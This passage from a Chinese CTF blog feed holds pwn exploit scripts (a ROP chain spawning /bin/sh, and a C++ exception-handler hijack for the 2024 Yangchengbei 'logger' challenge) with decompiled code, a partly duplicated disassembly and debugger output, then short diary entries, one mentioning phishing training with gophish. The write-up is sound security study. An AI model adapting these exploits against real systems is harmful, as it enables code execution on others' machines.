class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./control&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift = <span class="number">0x4D3350</span></span><br><span class="line">vuln = <span class="number">0x402183</span></span><br><span class="line"></span><br><span class="line">payload = p64(gift) + p64(vuln)</span><br><span class="line">r.sendafter(<span class="string">b&quot;Gift&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x70</span>+p64(gift)</span><br><span class="line">r.sendafter(<span class="string">b&quot;control?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x462c27</span></span><br><span class="line">pop_rdi = <span class="number">0x401c72</span></span><br><span class="line">pop_rsi = <span class="number">0x405285</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x495b8b</span></span><br><span class="line">syscall = <span class="number">0x40161e</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>  <span class="comment"># &lt;-- gift</span></span><br><span class="line">payload += p64(pop_rax)  <span class="comment"># &lt;-- ret地址</span></span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(gift)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="2024羊城杯-logger"><a href="#2024羊城杯-logger" class="headerlink" title="2024羊城杯 logger"></a>2024羊城杯 logger</h3><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>这道题就要用到最开始分析的方法了，因为这道题是有后门的。</p><p>trace函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4015AB</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+26h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nYou can record log details here: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_404020[<span class="number">16</span> * i + read(<span class="number">0</span>, &amp;byte_404020[<span class="number">16</span> * i], <span class="number">0x10</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Do you need to check the records? &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%1s&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v4 == <span class="number">121</span> || (_BYTE)v4 == <span class="number">89</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span> &amp;&amp; byte_404020[<span class="number">16</span> * j] &amp;&amp; v3; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31mRecord%d. %.16s\x1B[0m&quot;</span>, j + <span class="number">1</span>, &amp;byte_404020[<span class="number">16</span> * j]);</span><br><span class="line">        --v3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_BYTE)v4 != <span class="number">110</span> &amp;&amp; (_BYTE)v4 != <span class="number">78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input. Please enter &#x27;y&#x27; or &#x27;n&#x27;.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Records have been filled :(&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数允许我们写九次每次16个字节的数据，每次写入后会在末尾加一个截断符，写入的时候会检查该地址起始是否为\0。</p><p>warn函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_40178A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *exception; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  _BYTE buf[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  _QWORD v5[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  _QWORD v6[<span class="number">5</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_401CA0(buf);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  sub_4014FD(v5, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\x1B[1;31m%s\x1B[0m\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[!] Type your message here plz: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  HIBYTE(v3) = HIBYTE(v0);</span><br><span class="line">  buf[v0 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(byte_404200, buf, <span class="keyword">sizeof</span>(byte_404200));</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;dest[<span class="built_in">strlen</span>(dest)], <span class="string">&quot;: &quot;</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(dest, byte_404200, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(dest);</span><br><span class="line">    exception = __cxa_allocate_exception(<span class="number">8uLL</span>);</span><br><span class="line">    *exception = src;</span><br><span class="line">    __cxa_throw(exception, (<span class="keyword">struct</span> type_info *)&amp;`typeinfo <span class="keyword">for</span><span class="number">&#x27;</span><span class="type">char</span> *, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(byte_404100, buf, <span class="keyword">sizeof</span>(byte_404100));</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">  sub_4014FD(v6, <span class="number">32LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[User input log]\nMessage: %s\nDone at %s\n&quot;</span>, byte_404100, (<span class="type">const</span> <span class="type">char</span> *)v6);</span><br><span class="line">  sub_401CCA(buf);</span><br><span class="line">  <span class="keyword">return</span> v7 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有抛出异常的函数，如果输入字节的长度大于16字节就会抛出异常。查看汇编发现当前函数是没有catch块的，而调用链上最近的catch块在main函数（其实也是调用链上唯一一个）。异常抛出函数将src处（在data段）的字符当作exception传给catch，然后打印一串字符，接着继续执行main函数，因为main是无限循环的，所以不会退出。</p><p>同时可以发现这个程序其实不止一个catch块，并且在0x401BC7的catch执行了system，所以我们可以劫持ret地址到这个后门catch块。接下来考虑怎么传参就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>CB                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>CF                 jz      <span class="type">short</span> loc_401BD9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D1                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401B</span>D4                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 loc_401BD9:                             ; CODE XREF: sub_401B8F+<span class="number">40</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000401B</span>E1                 mov     [rbp+command], rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>E5                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401B</span>E9                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>EC                 lea     rax, aAnExceptionOfT_1 ; <span class="string">&quot;[-] An exception of type String was cau&quot;</span>...</span><br><span class="line">.text:<span class="number">0000000000401B</span>F3                 mov     rdi, rax        ; format</span><br><span class="line">.text:<span class="number">0000000000401B</span>F6                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>FB ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000401</span>C00                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401</span>C04                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000401</span>C07                 call    _system</span><br><span class="line">.text:<span class="number">0000000000401</span>C07 ;   &#125; <span class="comment">// starts at 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C0C                 nop</span><br><span class="line">.text:<span class="number">0000000000401</span>C0D                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C12                 jmp     <span class="type">short</span> loc_401C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ;   cleanup() <span class="comment">// owned by 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C14                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401</span>C18                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">0000000000401</span>C1B                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C20                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000401</span>C23                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401</span>C26                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B loc_401C2B:                             ; CODE XREF: sub_401B8F+<span class="number">83</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000401</span>C2F                 leave</span><br><span class="line">.text:<span class="number">0000000000401</span>C30                 retn</span><br><span class="line">.text:<span class="number">0000000000401</span>C30 ; &#125; <span class="comment">// starts at 401B8F</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C30 sub_401B8F      endp</span><br></pre></td></tr></table></figure><p>可以看到参数是rbp-0x18处的数据，但是在0x401BE1处程序将rax赋给了rbp-0x18，所以要动调看看赋了什么。动调发现是0x4040a0，所以我们需要在这个地方写入binsh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/32gx 0x404020</span></span><br><span class="line">0x404020:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404030:       0x3b68732f6e69622f      0x00000000004040a0</span><br><span class="line">0x404040:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404050:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404060:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404070:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404080:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404090:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x4040a0:       0x0068732f6e69622f      0x00776f6c6672000a</span><br><span class="line">0x4040b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4040c0:       0x00007fa631b00848      0x00007fa631b006f8</span><br><span class="line">0x4040d0:       0x00007fa6319908c0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>原本0x4040a0是<code>Buffer Overflow</code>这个字符串，但是利用trace在末尾加截断符的性质可以将这个字符串覆写为binsh。</p><p>至于rbp劫持了为多少，只要rbp-0x18不要超出data段就行了。</p><p>对了，这里一样也是不用顾虑canary的问题，因为抛出异常之后，<code>__stack_chk_fail</code>不会被执行到。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;details here:&quot;</span>, content)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;records?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;plz: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    trace(<span class="string">b&#x27;/bin/sh;&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">trace(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x401BE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">warn(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*(<span class="number">0x70</span>//<span class="number">8</span>)+p64(<span class="number">0x404050</span>)+p64(<span class="number">0x401bc7</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cpp异常处理机制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> cpp异常处理机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-25</title>
      <link href="/2024/diary/24-8-25/"/>
      <url>/2024/diary/24-8-25/</url>
      
        <content type="html"><![CDATA[<p>结营，证书+2，知识+n</p><p>准备一下蓝队的知识吧</p><p>算了学<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">protobuf</a></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-24</title>
      <link href="/2024/diary/24-8-24/"/>
      <url>/2024/diary/24-8-24/</url>
      
        <content type="html"><![CDATA[<p><a href="https://mlm.lingyiwanwu.com/">机器语言大模型MLM</a></p><p>来自高傲的清华</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-23</title>
      <link href="/2024/diary/24-8-23/"/>
      <url>/2024/diary/24-8-23/</url>
      
        <content type="html"><![CDATA[<p>今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。</p><p>可能老了，不喜欢太花里胡哨的东西了（</p><p>今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。</p><p>今天似乎过得异常地轻松，比起前几天高强度的学习和考核。总算可以休息一会了。</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志 24-8-21</title>
      <link href="/2024/diary/24-8-21/"/>
